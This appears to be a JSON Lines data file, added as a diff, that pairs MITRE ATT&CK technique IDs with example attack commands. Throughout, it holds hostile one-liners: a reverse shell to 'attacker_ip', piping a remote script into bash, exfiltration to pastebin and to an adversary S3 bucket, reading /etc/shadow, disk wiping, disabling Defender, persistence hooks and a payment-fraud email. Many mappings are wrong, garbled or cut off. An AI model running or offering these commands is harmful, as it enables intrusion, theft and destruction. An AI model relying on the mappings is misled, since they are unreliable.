+{"ID": "T1584.006", "Name": "Web Services", "Platform": "PRE", "Command": "python -c 'import requests; s = requests.Session(); s.post(\"https://example.com/login\", data={\"username\": \"username\", \"password\": \"password\"}); s.get(\"https://example.com/endpoint\")'"}
+{"ID": "T1601", "Name": "Modify System Image", "Platform": "Network Devices", "Command": "mv /path/to/original/os/file /path/to/temporary/location && cp /path/to/malicious/os/file /path/to/original/os/file"}
+{"ID": "T1574", "Name": "Hijack Execution Flow", "Platform": "Linux", "Command": "echo 'export PATH=$PATH:/usr/local/bin/malicious' >> ~/.bashrc"}
+{"ID": "T1036.012", "Name": "Browser Fingerprint", "Platform": "Linux", "Command": "curl -H \"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\""}
+{"ID": "T1059.011", "Name": "Lua", "Platform": "Linux", "Command": "lua -e \"os.execute('ls -l')\""}
+{"ID": "T1027.005", "Name": "Indicator Removal from Tools", "Platform": "Linux", "Command": "mv /path/to/malicious/file /path/to/malicious/file.bak && cp /path/to/malicious/file.bak /path/to/malicious/file"}
+{"ID": "T1204.003", "Name": "Malicious Image", "Platform": "IaaS", "Command": "aws ec2 run-instances --image-id ami-12345678"}
+{"ID": "T1543.005", "Name": "Container Service", "Platform": "Containers", "Command": "docker run -d --restart=always --name <image_name>"}
+{"ID": "T1078", "Name": "Valid Accounts", "Platform": "Containers", "Command": "docker run -it --rm -v /path/to/credentials:/credentials:ro --entrypoint=/bin/bash -e \"cat /credentials/credentials.txt\""}
+{"ID": "T1571", "Name": "Non-Standard Port", "Platform": "ESXi", "Command": "netsh interface ipv4 set dynamic 8088 tcp 8088"}
+{"ID": "T1585.001", "Name": "Social Media Accounts", "Platform": "PRE", "Command": "python social_media_accounts.py"}
+{"ID": "T1073", "Name": "DLL Side-Loading", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SideBySide\\WinSxS\\Manifests\" /v \"DLLName\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1055.012", "Name": "Process Hollowing", "Platform": "Windows", "Command": "CreateProcessA(0x1000, \"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL); ZwUnmapViewOfSection(NULL, NULL); WriteProcessMemory(NULL, 0x1000, \"malicious code\", 0x1000, NULL); VirtualAllocEx(NULL, NULL, 0x1000, 0x3000, 0x40); SetThreadContext(NULL, NULL, NULL); ResumeThread(NULL);"}
+{"ID": "T1068", "Name": "Exploitation for Privilege Escalation", "Platform": "Containers", "Command": "docker run -it --privileged --rm -v /:/mnt --cap-add=SYS_ADMIN -v /var/lib/docker/:/var/lib/docker/ -v /var/run/docker.sock:/var/run/docker.sock -v $(which docker):/usr/bin/docker <image_name>"}
+{"ID": "T1564.009", "Name": "Resource Forking", "Platform": "macOS", "Command": "ls -l"}
+{"ID": "T1531", "Name": "Account Access Removal", "Platform": "Linux", "Command": "passwd -L username"}
+{"ID": "T1110.004", "Name": "Credential Stuffing", "Platform": "Windows", "Command": "nmap -p 3389 -A 192.168.1.100"}
+{"ID": "T1208", "Name": "Kerberoasting", "Platform": "Windows", "Command": "klist targets /v2"}
+{"ID": "T1027", "Name": "Obfuscated Files or Information", "Platform": "ESXi", "Command": "vmkfstools -D -f gzip -o /tmp/obfuscated.vmdk /path/to/obfuscated.vmdk"}
+{"ID": "T1556.006", "Name": "Multi-Factor Authentication", "Platform": "Windows", "Command": "net stop azureadsync"}
+{"ID": "T1114.002", "Name": "Remote Email Collection", "Platform": "Windows", "Command": "powershell -c \"Get-MailboxStatistics -Server `<server_name>` | Select-Object -ExpandProperty TotalItemsInDatabase\""}
+{"ID": "T1505.004", "Name": "IIS Components", "Platform": "Windows", "Command": "net stop w3svc"}
+{"ID": "T1036.001", "Name": "Invalid Code Signature", "Platform": "Windows", "Command": "signtool.exe /f \"C:\\path\\to\\file.exe\" /fd1 /tdv3"}
+{"ID": "T1564.006", "Name": "Run Virtual Instance", "Platform": "Linux", "Command": "vmware-cmd -s \"/path/to/.vmx\""}
+{"ID": "T1154", "Name": "Trap", "Platform": "Linux", "Command": "trap 'echo \"Exiting gracefully\"; exit 0' INT"}
+{"ID": "T1027.014", "Name": "Polymorphic Code", "Platform": "Windows", "Command": "msseh.exe /s /t 1 /c \"cmd /c calc\""}
+{"ID": "T1201", "Name": "Password Policy Discovery", "Platform": "Windows", "Command": "net accounts /domain"}
+{"ID": "T1546", "Name": "Event Triggered Execution", "Platform": "Linux", "Command": "sudo systemctl enable --now systemd-udev-settle && systemctl start systemd-udev-settle && systemctl status systemd-udev-settle"}
+{"ID": "T1546.004", "Name": "Unix Shell Configuration Modification", "Platform": "Linux", "Command": "echo'malicious_command' >> /etc/profile"}
+{"ID": "T1187", "Name": "Forced Authentication", "Platform": "Windows", "Command": "net use \\\\[remote address]\\pic.png /u:%username%"}
+{"ID": "T1134.005", "Name": "SID-History Injection", "Platform": "Windows", "Command": "net localgroup \"Enterprise Admins\" /add \"BUILTIN\\Enterprise Admins\""}
+{"ID": "T1599", "Name": "Network Boundary Bridging", "Platform": "Network Devices", "Command": "show running-config"}
+{"ID": "T1486", "Name": "Data Encrypted for Impact", "Platform": "ESXi", "Command": "vmware-cmd -g \"shutdown guest\""}
+{"ID": "T1488", "Name": "Disk Content Wipe", "Platform": "Linux", "Command": "dd if=/dev/urandom of=/dev/sdb bs=4096 count=100"}
+{"ID": "T1553", "Name": "Subvert Trust Controls", "Platform": "Windows", "Command": "certutil.exe -SETCATATTRIB -l \"Trusted Publisher\" \"C:\\path\\to\\malicious.exe\""}
+{"ID": "T1548.004", "Name": "Elevated Execution with Prompt", "Platform": "macOS", "Command": "AuthorizationExecuteWithPrivileges(\"/path/to/malicious/command\")"}
+{"ID": "T1592.003", "Name": "Firmware", "Platform": "PRE", "Command": "python search_firmware.py"}
+{"ID": "T1573", "Name": "Encrypted Channel", "Platform": "ESXi", "Command": "esxcli security certificates import --cert-url=\"https://example.com/encrypted_channel_cert.pem\""}
+{"ID": "T1174", "Name": "Password Filter DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\System\\PasswordFilter\" /v \"DLLPath\" /t REG_SZ /d \"C:\\path\\to\\malicious_filter.dll\" /f"}
+{"ID": "T1547.002", "Name": "Authentication Package", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Software Protection\\PS\\1\" /v \"Authentication Packages\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1218.010", "Name": "Regsvr32", "Platform": "Windows", "Command": "regsvr32 /s /u \"%windir%\\system32\\cmd.dll,cmdclass\""}
+{"ID": "T1002", "Name": "Data Compressed", "Platform": "Linux", "Command": "rar a -r -b -ep1 -ag12 -m5 -m0 -inul -o- sensitive_data.rar /path/to/sensitive/data"}
+{"ID": "T1567.003", "Name": "Exfiltration to Text Storage Sites", "Platform": "Linux", "Command": "curl -s 'https://pastebin.com/raw' -X POST -H 'Content-Type: text/plain' -d 'your_data_here'"}
+{"ID": "T1081", "Name": "Credentials in Files", "Platform": "Windows", "Command": "dir \"C:\\*password*.txt\""}
+{"ID": "T1592.002", "Name": "Software", "Platform": "PRE", "Command": "nmap -sV <target_IP>"}
+{"ID": "T1128", "Name": "Netsh Helper DLL", "Platform": "Windows", "Command": "netsh exec=\"C:\\path\\to\\helper.dll\""}
+{"ID": "T1056", "Name": "Input Capture", "Platform": "Linux", "Command": "tcpdump -i any -A -s 0 -c 100 -vvv -w capture.pcap \"tcp port 80\""}
+{"ID": "T1566.004", "Name": "Spearphishing Voice", "Platform": "Linux", "Command": "echo \"You have won a prize, please call 1-800-123-4567 to claim it.\" | aplay -q -t wav -r 8k -c 1 -f s16_le -d /dev/stdin"}
+{"ID": "T1587.004", "Name": "Exploits", "Platform": "PRE", "Command": "python exploit.py"}
+{"ID": "T1593.001", "Name": "Social Media", "Platform": "PRE", "Command": "twitter search"}
+{"ID": "T1213.004", "Name": "Customer Relationship Management Software", "Platform": "SaaS", "Command": "az login"}
+{"ID": "T1546.015", "Name": "Component Object Model Hijacking", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Classes\\TypeLib\\{guid}\" /v \"InprocServer32\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1589.001", "Name": "Credentials", "Platform": "PRE", "Command": "python CredentialFinder.py -d \"target_domain\""}
+{"ID": "T1195.002", "Name": "Compromise Software Supply Chain", "Platform": "Linux", "Command": "git add. && git commit -m \"malicious commit\" && git push origin master"}
+{"ID": "T1036.003", "Name": "Rename Legitimate Utilities", "Platform": "Linux", "Command": "mv /bin/rundll32.exe /bin/renamed_rundll32.exe"}
+{"ID": "T1102.002", "Name": "Bidirectional Communication", "Platform": "Linux", "Command": "curl -s https://example.com/command | bash"}
+{"ID": "T1203", "Name": "Exploitation for Client Execution", "Platform": "Linux", "Command": "nmap -sC <target_IP>"}
+{"ID": "T1595.003", "Name": "Wordlist Scanning", "Platform": "PRE", "Command": "dirb http://example.com"}
+{"ID": "T1667", "Name": "Email Bombing", "Platform": "Linux", "Command": "python -c 'import smtplib; s = smtplib.SMTP(\"smtp.gmail.com\"); s.sendmail(\"attacker@gmail.com\", \"victim@example.com\", \"Subject: Test Email\\nFrom: attacker@gmail.com\\nTo: victim@example.com\\n\\nThis is a test email.\")'"}
+{"ID": "T1562.011", "Name": "Spoof Security Alerting", "Platform": "Windows", "Command": "net stop windefend"}
+{"ID": "T1137.004", "Name": "Outlook Home Page", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Preferences\" /v \"Home Page\" /t REG_SZ /d \"http://example.com/malicious_page.html\" /f"}
+{"ID": "T1573.002", "Name": "Asymmetric Cryptography", "Platform": "ESXi", "Command": "esxcli security certificates import --certfile=/path/to/public/key.pem --privatekeyfile=/path/to/private/key.pem"}
+{"ID": "T1567.002", "Name": "Exfiltration to Cloud Storage", "Platform": "ESXi", "Command": "vmware-cmd -g /vmfs/volumes/.../vmname/ -H \"upload /path/to/data /path/to/cloud/storage\""}
+{"ID": "T1570", "Name": "Lateral Tool Transfer", "Platform": "ESXi", "Command": "vmkfstools -m -i /path/to/source/file /path/to/destination/file.vmdk"}
+{"ID": "T1574.009", "Name": "Path Interception by Unquoted Path", "Platform": "Windows", "Command": "net start \"C:\\program.exe\""}
+{"ID": "T1608.003", "Name": "Install Digital Certificate", "Platform": "PRE", "Command": "openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365"}
+{"ID": "T1168", "Name": "Local Job Scheduling", "Platform": "Linux", "Command": "0 0 * * * /path/to/command"}
+{"ID": "T1166", "Name": "Setuid and Setgid", "Platform": "Linux", "Command": "chmod +s /path/to/file"}
+{"ID": "T1037.005", "Name": "Startup Items", "Platform": "macOS", "Command": "mv /Library/Startup\\ Items/MyStartupItem/StartupParameters.plist /Library/Startup\\ Items/MyStartupItem/StartupParameters.plist"}
+{"ID": "T1100", "Name": "Web Shell", "Platform": "Linux", "Command": "python -c 'import os; os.system(\"bash -i >& /dev/tcp/attacker_ip/8080 0>&1\")'"}
+{"ID": "T1186", "Name": "Process Doppelgänging", "Platform": "Windows", "Command": "CreateTransaction"}
+{"ID": "T1184", "Name": "SSH Hijacking", "Platform": "Linux", "Command": "ssh -L 8080:localhost:8080 user@target_host"}
+{"ID": "T1614.001", "Name": "System Language Discovery", "Platform": "Linux", "Command": "locale"}
+{"ID": "T1095", "Name": "Non-Application Layer Protocol", "Platform": "ESXi", "Command": "vmware-cmd -g /vmfs/volumes/ --list"}
+{"ID": "T1075", "Name": "Pass the Hash", "Platform": "Windows", "Command": "net use \\\\server\\share /user:username /user:password"}
+{"ID": "T1059.013", "Name": "Container CLI/API", "Platform": "Containers", "Command": "docker run -it --rm -v /:/host -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c \"docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' host\""}
+{"ID": "T1027.003", "Name": "Steganography", "Platform": "Linux", "Command": "steghide embed -cf secret.txt -xf output.png"}
+{"ID": "T1584.002", "Name": "DNS Server", "Platform": "PRE", "Command": "nmap -sS -Pn -p 53 192.168.1.0/24"}
+{"ID": "T1671", "Name": "Cloud Application Integration", "Platform": "Office Suite", "Command": "az ad sp create-for-rbac --name \"malicious-application\" --role \"Contributor\" --scopes \"https://graph.microsoft.com/.default\""}
+{"ID": "T1001.003", "Name": "Protocol or Service Impersonation", "Platform": "ESXi", "Command": "esxcli network firewall ruleset add -action=allow -rule=1 -protocol=tcp -dstport=443 -ipaddress=192.168.1.100"}
+{"ID": "T1012", "Name": "Query Registry", "Platform": "Windows", "Command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""}
+{"ID": "T1030", "Name": "Data Transfer Size Limits", "Platform": "Linux", "Command": "nc -l -p 8080 -e cat /path/to/large/file"}
+{"ID": "T1028", "Name": "Windows Remote Management", "Platform": "Windows", "Command": "winrm -r"}
+{"ID": "T1550.004", "Name": "Web Session Cookie", "Platform": "SaaS", "Command": "curl -c cookies.txt 'https://example.com'"}
+{"ID": "T1078.002", "Name": "Domain Accounts", "Platform": "ESXi", "Command": "esxcli system sso get -s <esxhost> -u <domain>\\<username> -p <password>"}
+{"ID": "T1218.009", "Name": "Regsvcs/Regasm", "Platform": "Windows", "Command": "regasm /codebase+ /uninstall \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1034", "Name": "Path Interception", "Platform": "Windows", "Command": "net user"}
+{"ID": "T1546.018", "Name": "Python Startup Hooks", "Platform": "Linux", "Command": "echo 'import os; os.system(\"python -c 'import os; os.system(\\\"rm /tmp/persistence_script.py\\\")'\")' > /usr/lib/python3.10/site-packages/persistence.pth"}
+{"ID": "T1506", "Name": "Web Session Cookie", "Platform": "Office 365", "Command": "Get-Content -Path \"C:\\path\\to\\cookie.txt\" | Invoke-WebRequest -Uri \"https://login.microsoftonline.com/\" -Method Post -Body @{grant_type=\"client_credentials\"; client_id=\"client_id\"; client_secret=\"client_secret\"; scope=\"https://graph.microsoft.com/.default\"} -Headers @{\"Cookie\"=\"session_cookie\"}"}
+{"ID": "T1553.004", "Name": "Install Root Certificate", "Platform": "Linux", "Command": "sudo certmgr -t -a -i /path/to/malicious/cert -> sudo certmgr -t -a -i /path/to/malicious/cert"}
+{"ID": "T1037.003", "Name": "Network Logon Script", "Platform": "Windows", "Command": "net localgroup \"Remote Desktop Users\" /add \"Domain Admins\""}
+{"ID": "T1499", "Name": "Endpoint Denial of Service", "Platform": "Windows", "Command": "netstat -a -n"}
+{"ID": "T1027.004", "Name": "Compile After Delivery", "Platform": "Linux", "Command": "gcc -o output payload.c"}
+{"ID": "T1065", "Name": "Uncommonly Used Port", "Platform": "Linux", "Command": "nc -v -p 12345 <target_IP>"}
+{"ID": "T1614", "Name": "System Location Discovery", "Platform": "IaaS", "Command": "aws ec2 describe-instance-attribute --instance-id --attribute group=\"placement\""}
+{"ID": "T1564.007", "Name": "VBA Stomping", "Platform": "Linux", "Command": "python vba_stomper.py --input-file malicious_doc.docx --output-file benign_doc.docx"}
+{"ID": "T1197", "Name": "BITS Jobs", "Platform": "Windows", "Command": "bitsadmin /transfer \"http://example.com/malicious_file.exe\" /priority high"}
+{"ID": "T1127.001", "Name": "MSBuild", "Platform": "Windows", "Command": "msbuild.exe /t:build /p:Configuration=Release /verbosity:minimal \"C:\\path\\to\\malicious\\project.csproj\""}
+{"ID": "T1656", "Name": "Impersonation", "Platform": "Linux", "Command": "sudo apt-get install python3 && python3 -m pip install python-smbus && python3 -c 'import smtplib; s = smtplib.SMTP(\"smtp.gmail.com\", 587); s.starttls(); s.login(\"victim_email@gmail.com\", \"victim_password\"); s.sendmail(\"victim_email@gmail.com\", \"target_email@example.com\", \"Subject: Urgent: Payment Request\\nDear Target,\\nPlease send money to the following account...\")'"}
+{"ID": "T1578.005", "Name": "Modify Cloud Compute Configurations", "Platform": "IaaS", "Command": "az update resource group --name MyResourceGroup --tags Environment=prod --location westus2"}
+{"ID": "T1088", "Name": "Bypass User Account Control", "Platform": "Windows", "Command": "rundll32.exe C:\\Windows\\System32\\comdlg32.dll,ShellDesk.dll,RunDLL32"}
+{"ID": "T1494", "Name": "Runtime Data Manipulation", "Platform": "Linux", "Command": "`echo \"Hello, Earth!\" | sed's/World/Earth/'"}
+{"ID": "T1090.004", "Name": "Domain Fronting", "Platform": "Linux", "Command": "openssl s_client -connect example.com:443 -servername example.com -servername example.net -servername example.io"}
+{"ID": "T1557.002", "Name": "ARP Cache Poisoning", "Platform": "Linux", "Command": "arpspoof -i eth0 -t 192.168.1.2 192.168.1.1"}
+{"ID": "T1562.008", "Name": "Disable or Modify Cloud Logs", "Platform": "IaaS", "Command": "az network watcher config disable"}
+{"ID": "T1518.001", "Name": "Security Software Discovery", "Platform": "IaaS", "Command": "aws cloudwatch get-logs --log-group-name /aws/CloudWatchAgentLogGroup"}
+{"ID": "T1564.003", "Name": "Hidden Window", "Platform": "Linux", "Command": "xset -q -display :0 -screen 0 1024 768"}
+{"ID": "T1493", "Name": "Transmitted Data Manipulation", "Platform": "Linux", "Command": "tcpdump -i eth0 -s 0 -w captured_traffic.pcap -vv -n -c 1000"}
+{"ID": "T1127.002", "Name": "ClickOnce", "Platform": "Windows", "Command": "rundll32.exe dfshim.dll,ShOpenVerbApplication"}
+{"ID": "T1059.006", "Name": "Python", "Platform": "ESXi", "Command": "python -c 'import os; os.system(\"powershell -c \\\"Get-WmiObject -Class Win32_Process | Select-Object -ExpandProperty Name\\\"\")'"}
+{"ID": "T1070.010", "Name": "Relocate Malware", "Platform": "Linux", "Command": "cp /path/to/malware /new/path/malware"}
+{"ID": "T1591.004", "Name": "Identify Roles", "Platform": "PRE", "Command": "identify_roles"}
+{"ID": "T1132", "Name": "Data Encoding", "Platform": "Linux", "Command": "base64 -d <<< \"SGVsbG8gd29ybGQ=\""}
+{"ID": "T1546.010", "Name": "AppInit DLLs", "Platform": "Windows", "Command": "reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs"}
+{"ID": "T1598", "Name": "Phishing for Information", "Platform": "PRE", "Command": "powershell -c \"Add-Type -AssemblyName System.Windows.Forms; $w = New-Object System.Windows.Forms.Form; $w.Text = 'Phishing for Information'; $w.ShowDialog()\""}
+{"ID": "T1496", "Name": "Resource Hijacking", "Platform": "Windows", "Command": "taskkill /f /im cryptominer.exe"}
+{"ID": "T1585", "Name": "Establish Accounts", "Platform": "PRE", "Command": "python setup.py install"}
+{"ID": "T1588", "Name": "Obtain Capabilities", "Platform": "PRE", "Command": "python -m pip install --upgrade pip && pip install requests"}
+{"ID": "T1546.002", "Name": "Screensaver", "Platform": "Windows", "Command": "reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"C:\\path\\to\\malicious\\scr\\file.scr\" /f"}
+{"ID": "T1147", "Name": "Hidden Users", "Platform": "macOS", "Command": "sudo dscl. -create /Users/username UniqueID 401"}
+{"ID": "T1556.009", "Name": "Conditional Access Policies", "Platform": "IaaS", "Command": "aws iam put-instance-profile --instance-profile-document file://path/to/conditional_access_policy.json"}
+{"ID": "T1578.002", "Name": "Create Cloud Instance", "Platform": "IaaS", "Command": "aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --key-name my_key --security-group-ids sg-12345678"}
+{"ID": "T1500", "Name": "Compile After Delivery", "Platform": "Linux", "Command": "gcc -o output payload.c"}
+{"ID": "T1555.006", "Name": "Cloud Secrets Management Stores", "Platform": "IaaS", "Command": "aws secretsmanager get-secret-value --secret-id secret_id --region us-west-2"}
+{"ID": "T1213.003", "Name": "Code Repositories", "Platform": "SaaS", "Command": "git ls-remote --get-url https://github.com/user/repository.git"}
+{"ID": "T1565.002", "Name": "Transmitted Data Manipulation", "Platform": "Linux", "Command": "tcpdump -i eth0 -s 0 -w captured_traffic.pcap -vv -n -c 100 -A tcp"}
+{"ID": "T1003.008", "Name": "/etc/passwd and /etc/shadow", "Platform": "Linux", "Command": "cat /etc/passwd /etc/shadow"}
+{"ID": "T1543.001", "Name": "Launch Agent", "Platform": "macOS", "Command": "launchctl load -w /Library/LaunchAgents/<agent_name>.plist"}
+{"ID": "T1569", "Name": "System Services", "Platform": "Windows", "Command": "sc config wuauserv start= auto & net start wuauserv"}
+{"ID": "T1059.003", "Name": "Windows Command Shell", "Platform": "Windows", "Command": "cmd /c \"ipconfig /all\""}
+{"ID": "T1055.009", "Name": "Proc Memory", "Platform": "Linux", "Command": "dd if=/dev/zero of=/proc/self/mem bs=1 count=1"}
+{"ID": "T1223", "Name": "Compiled HTML File", "Platform": "Windows", "Command": "hh.exe /a \"path\\to\\malicious.chm\""}
+{"ID": "T1650", "Name": "Acquire Access", "Platform": "PRE", "Command": "acquire_access()"}
+{"ID": "T1601.001", "Name": "Patch System Image", "Platform": "Network Devices", "Command": "copy tftp://<IP address of the compromised image> <filename>"}
+{"ID": "T1558.002", "Name": "Silver Ticket", "Platform": "Windows", "Command": "klist /users"}
+{"ID": "T1213", "Name": "Data from Information Repositories", "Platform": "Linux", "Command": "nmap -p 3306 -script http-headers,ssl-enum-ciphers,smb-vuln-ms17-010,smb-vuln-webdav-exec,smb-vuln-cve-2020-1015 http-methods,http-headers,http-enum,http-slowloris,http-shellshock,http-vuln-cve2017-5635,http-vuln-cve2017-9805 http-vuln-cve"}
+{"ID": "T1070.009", "Name": "Clear Persistence", "Platform": "ESXi", "Command": "esxcli vm process kill --type=soft --vm=<vm-name>"}
+{"ID": "T1059.012", "Name": "Hypervisor CLI", "Platform": "ESXi", "Command": "esxcli vm process kill --type=soft --vm=<vm-name>"}
+{"ID": "T1146", "Name": "Clear Command History", "Platform": "Linux", "Command": "history -c"}
+{"ID": "T1555.004", "Name": "Windows Credential Manager", "Platform": "Windows", "Command": "vaultcmd.exe /listall"}
+{"ID": "T1036.010", "Name": "Masquerade Account Name", "Platform": "Linux", "Command": "useradd -m -s /bin/bash -u 1000 masquerade_account"}
+{"ID": "T1519", "Name": "Emond", "Platform": "macOS", "Command": "launchctl unload /System/Library/LaunchAgents/com.apple.emond.plist"}
+{"ID": "T1194", "Name": "Spearphishing via Service", "Platform": "Windows", "Command": "powershell -Command \"Invoke-WebRequest -Uri 'https://example.com/malicious.exe' -OutFile 'C:\\Users\\Target\\Downloads\\malicious.exe'\""}
+{"ID": "T1200", "Name": "Hardware Additions", "Platform": "Windows", "Command": "netsh interface ip set address \"Local Area Connection\" wwinmgmt:disablebsd=4"}
+{"ID": "T1219.002", "Name": "Remote Desktop Software", "Platform": "Linux", "Command": "vncviewer <target_IP>"}
+{"ID": "T1505", "Name": "Server Software Component", "Platform": "Windows", "Command": "powershell -ExecutionPolicy Bypass -Command \"Add-Type -TypeDefinition '[DllImport(\\\"kernel32.dll\\\")] public class Win32 { [return: MarshalAs(UnmanagedType.Bool)] public static extern bool MoveFileEx(string lpFileName, uint dwMoveOperation, uint dwFlags); }'; [Win32]::MoveFileEx('C:\\\\path\\\\to\\\\malicious.dll', 0x2, 0x100)\""}
+{"ID": "T1485", "Name": "Data Destruction", "Platform": "Containers", "Command": "docker rm -f $(docker ps -aq)"}
+{"ID": "T1132.002", "Name": "Non-Standard Encoding", "Platform": "ESXi", "Command": "vmkernal.set_param(\"encoding\", \"base64\")"}
+{"ID": "T1556.001", "Name": "Domain Controller Authentication", "Platform": "Windows", "Command": "net stop winlogon"}
+{"ID": "T1537", "Name": "Transfer Data to Cloud Account", "Platform": "IaaS", "Command": "aws s3 sync s3://victim-bucket s3://adversary-bucket --delete"}
+{"ID": "T1027.006", "Name": "HTML Smuggling", "Platform": "Windows", "Command": "javascript:eval(atob('dmVyc2lvbiBzZXRzLm9wZW5zdHJhdG9yKCdodHRwOi8vbW9iaWxlLm9yZS9wb3N0cy9hcHBsaWNhcnkucGhwP2NvbmZpZ3VyZS1wdWxhdGlvbi1zdHJhdG9yK2U9ZmlsZS5qc29uJz4='));"}
+{"ID": "T1556.005", "Name": "Reversible Encryption", "Platform": "Windows", "Command": "Set-ADUser -AllowReversiblePasswordEncryption $true"}
+{"ID": "T1027.010", "Name": "Command Obfuscation", "Platform": "Linux", "Command": "echo -e \"Word\\nApplication\""}
+{"ID": "T1130", "Name": "Install Root Certificate", "Platform": "Linux", "Command": "sudo certmgr -t -i /path/to/malicious/cert -> sudo certmgr -trustcache -import /path/to/malicious/cert"}
+{"ID": "T1022", "Name": "Data Encrypted", "Platform": "Linux", "Command": "rar a -hp -r -ep1 -inul -o- encrypted_data.rar /path/to/data"}
+{"ID": "T1070.004", "Name": "File Deletion", "Platform": "ESXi", "Command": "rm"}
+{"ID": "T1189", "Name": "Drive-by Compromise", "Platform": "Identity Provider", "Command": "curl -X GET 'https://example.com/malicious-script'"}
+{"ID": "T1498", "Name": "Network Denial of Service", "Platform": "Windows", "Command": "netstat -a -n"}
+{"ID": "T1651", "Name": "Cloud Administration Command", "Platform": "IaaS", "Command": "aws ssm send-command --document-name \"AWS-RunShellScript\" --targets \"Key='InstanceIds',Values=['i-0123456789abcdef0']\" --parameters '{\"commands\":[\"ls -l\"]}\""}
+{"ID": "T1546.016", "Name": "Installer Packages", "Platform": "Linux", "Command": "dpkg-divert /usr/sbin/dpkg-divert --force --add --package-name --priority=low --divert-overwrite /var/lib/dpkg/info/package.postinst"}
+{"ID": "T1595.001", "Name": "Scanning IP Blocks", "Platform": "PRE", "Command": "nmap -sP 192.168.1.0/24"}
+{"ID": "T1158", "Name": "Hidden Files and Directories", "Platform": "Linux", "Command": "ls -a"}
+{"ID": "T1221", "Name": "Template Injection", "Platform": "Windows", "Command": "powershell -c \"Add-Type -TypeDefinition '[DllImport(\\\"user32\\\")] public class User32 { [return: MarshalAs(UnmanagedType.Bool)] public static extern bool MoveFileEx(string lpFileName, uint dwMoveOperation, uint dwFlags); }'; $file = 'C:\\path\\to\\malicious.docx'; $newFile = 'C:\\path\\to\\newfile.docx'; $template = 'http://example.com/malicious_template.docx'; [User32]::MoveFileEx($file, 0x2, 0x100); Copy-Item -Path $template -Destination"}
+{"ID": "T1037.004", "Name": "RC Scripts", "Platform": "macOS", "Command": "mv /etc/rc.local /etc/rc.local.bak && echo \"your_malicious_command\" >> /etc/rc.local"}
+{"ID": "T1134", "Name": "Access Token Manipulation", "Platform": "Windows", "Command": "wtsquery.exe sessionid=1 /domain:\\\\server /u:administrator"}
+{"ID": "T1209", "Name": "Time Providers", "Platform": "Windows", "Command": "sc config w32time start= auto"}
+{"ID": "T1111", "Name": "Multi-Factor Authentication Interception", "Platform": "Linux", "Command": "sudo apt install keylogger"}
+{"ID": "T1159", "Name": "Launch Agent", "Platform": "macOS", "Command": "launchctl load /Library/LaunchAgents/com.example.agent.plist"}
+{"ID": "T1027.002", "Name": "Software Packing", "Platform": "Linux", "Command": "upx -9 --lzma /path/to/packed/file"}
+{"ID": "T1584.007", "Name": "Serverless", "Platform": "PRE", "Command": "nmap -sS -Pn -p 80,443 <target_IP>"}
+{"ID": "T1071.001", "Name": "Web Protocols", "Platform": "ESXi", "Command": "nmap -sT --script http-headers --script-args http-headers.insert=\"Authorization: Bearer <token>\" <target_IP>"}
+{"ID": "T1059.005", "Name": "Visual Basic", "Platform": "Linux", "Command": "vbs2exe -x \"C:\\path\\to\\malicious.vbs\""}
+{"ID": "T1564.005", "Name": "Hidden File System", "Platform": "Linux", "Command": "dd if=/dev/zero of=/mnt/hfs bs=1M count=1"}
+{"ID": "T1543.002", "Name": "Systemd Service", "Platform": "Linux", "Command": "systemctl enable --now malicious_service.service"}
+{"ID": "T1668", "Name": "Exclusive Control", "Platform": "Linux", "Command": "sudo apt-get update && sudo apt-get install -y unattended-upgrades && sudo unattended-upgrade -y -d"}
+{"ID": "T1563.002", "Name": "RDP Hijacking", "Platform": "Windows", "Command": "C:\\Windows\\System32\\tscon.exe 1"}
+{"ID": "T1136", "Name": "Create Account", "Platform": "Windows", "Command": "net user newaccountname /add"}
+{"ID": "T1547.013", "Name": "XDG Autostart Entries", "Platform": "Linux", "Command": "rm -rf /etc/xdg/autostart/malicious.desktop && echo \"[Desktop Entry]\" > /etc/xdg/autostart/malicious.desktop && echo \"Type=Application\" >> /etc/xdg/autostart/malicious.desktop && echo \"Exec=/bin/bash -c'malicious_command'\" >> /etc/xdg/autostart/malicious.desktop && chmod +x /etc/xdg/autostart/malicious.desktop"}
+{"ID": "T1584.004", "Name": "Server", "Platform": "PRE", "Command": "nmap -sS -Pn -p 80,443 192.168.1.0/24"}
+{"ID": "T1672", "Name": "Email Spoofing", "Platform": "Office Suite", "Command": "powershell -c \"Add-Type -AssemblyName System.Net.Mail; $msg = New-Object System.Net.Mail.MailMessage; $msg.From ='spoofed_email@example.com'; $msg.To.Add('victim_email@example.com'); $msg.Subject = 'Spoofed Email'; $msg.Body = 'This is a spoofed email'; $smtp = New-Object System.Net.Mail.SmtpClient; $smtp.Host ='smtp.example.com'; $smtp.Port = 587; $smtp.EnableSsl = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential('spoofed_email@example.com', 'password"}
+{"ID": "T1526", "Name": "Cloud Service Discovery", "Platform": "IaaS", "Command": "aws iam list-account-aliases"}
+{"ID": "T1204.004", "Name": "Malicious Copy and Paste", "Platform": "Linux", "Command": "bash -c 'echo \"your_malicious_code_here\" | bash'"}
+{"ID": "T1151", "Name": "Space after Filename", "Platform": "Linux", "Command": "mv evil.sh evil.sh"}
